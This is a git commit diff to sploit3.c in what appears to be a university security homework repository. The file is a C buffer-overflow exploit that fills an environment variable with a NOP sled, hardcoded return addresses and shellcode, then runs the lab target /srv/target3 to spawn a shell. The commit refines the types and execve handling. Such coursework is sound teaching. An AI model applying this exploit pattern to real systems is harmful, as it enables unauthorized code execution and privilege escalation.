dd503d0e4ca4ed6b86c62388c85cdc54a03256f6
justinhalford <justinhalford@gmail.com>
2024-05-10 19:01:37 -0400

    may 7

--- cs5435-hw4/sploits/sploit3.c
+++ cs5435-hw4/sploits/sploit3.c
@@ -6,21 +6,21 @@
 #include "shellcode.h"
 
 #define TARGET "/srv/target3"
-const size_t ENV_SIZE = 400;
-const uintptr_t BASE_ADDRESS = 0xffffdec0;
-const size_t NOP_SLED_SIZE = 201;
-const uint8_t NOP = 0x90;
-const size_t RET_ADDR_OFFSET = 4;
+#define ENV_SIZE 400
+#define BASE_ADDRESS 0xffffdec0
+#define NOP_SLED_SIZE 201
+#define NOP 0x90
+#define RET_ADDR_OFFSET 4
 
-const uintptr_t START_ADDRESS = BASE_ADDRESS + RET_ADDR_OFFSET;
-const uintptr_t SECOND_ADDRESS = BASE_ADDRESS + 2 * RET_ADDR_OFFSET;
+const uint32_t START_ADDRESS = BASE_ADDRESS + RET_ADDR_OFFSET;
+const uint32_t SECOND_ADDRESS = BASE_ADDRESS + 2 * RET_ADDR_OFFSET;
 const char PADDING[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
 
 void prepareEnvironment(char *environment) {
     memset(environment, NOP, ENV_SIZE - 1);
-    *(uintptr_t *)(environment) = START_ADDRESS;
-    *(uintptr_t *)(environment + RET_ADDR_OFFSET) = SECOND_ADDRESS;
-    memcpy(environment + NOP_SLED_SIZE, shellcode, sizeof(shellcode));
+    *((uint32_t *)(environment)) = START_ADDRESS;
+    *((uint32_t *)(environment + RET_ADDR_OFFSET)) = SECOND_ADDRESS;
+    memcpy(environment + NOP_SLED_SIZE, shellcode, sizeof(shellcode) - 1);
     environment[ENV_SIZE - 1] = '\0';
 }
 
@@ -30,10 +30,11 @@ int main(void) {
 
     prepareEnvironment(environment);
 
-    char *env[] = {environment};
+    char *env[] = {environment, NULL};
 
-    execve(TARGET, arguments, env);
-    perror("execve failed");
+    if (execve(TARGET, arguments, env) == -1) {
+        perror("execve failed");
+    }
 
-    return 0;
+    return EXIT_FAILURE; // If execve fails, the return will be reached.
 }
